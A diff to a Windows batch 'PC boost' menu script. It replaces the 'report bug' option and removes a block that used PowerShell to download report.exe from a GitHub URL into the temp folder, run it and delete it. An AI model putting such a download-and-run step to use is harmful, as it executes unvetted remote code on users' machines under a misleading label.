@@ -86,7 +86,7 @@ echo                   ║ [10] fixed error windows file    ║ [25] clear log f
 echo                   ║ [11] Backup                      ║ [26] boost valorant          ║
 echo                   ║ [12] FULL CLEAN                  ║ [27] start Setting scan virus║                   
 echo                   ║ [13] edit power plan             ║ [28] start Riot              ║ 
-echo                   ║ [14] Boost cpu                   ║ [29] report bug              ║ 
+echo                   ║ [14] Boost cpu                   ║ [29] commingsoon             ║ 
 echo                   ║ [15] mouse                       ║ [30] task manager            ║ 002 UPDATE
 echo                   ║ [funtcion] not found             ║ [31] Boost real time ::beta  ║ 000 credit 
 echo                   ║ [33] more                        ║ [32] SUPER Ultimate Boost CPU║ Type RESTORE for reset This pc
@@ -124,7 +124,7 @@ if %choix%== 25 goto :log
 if %choix%== 26 goto :valo
 if %choix%== 27 goto :virus
 if %choix%== 28 goto :valorantStart
-if %choix%== 29 goto :bug
+if %choix%== 29 goto :commingsoon
 if %choix%== 30 goto :task
 if %choix%== 000 goto :www
 if %choix%== 001 goto :wwwr
@@ -178,11 +178,6 @@ title start task manager
 echo Starting......
 timeout /t 5 /nobreak > NUL
 taskmgr
-goto menu
-:bug
-powershell.exe Invoke-WebRequest -Uri "https://github.com/rrpt66/12/raw/main/report.exe" -OutFile "%temp%\report.exe"
-start /wait %temp%\report.exe
-del /q %temp%\report.exe
 goto menu
 :valorantStart
 @echo off
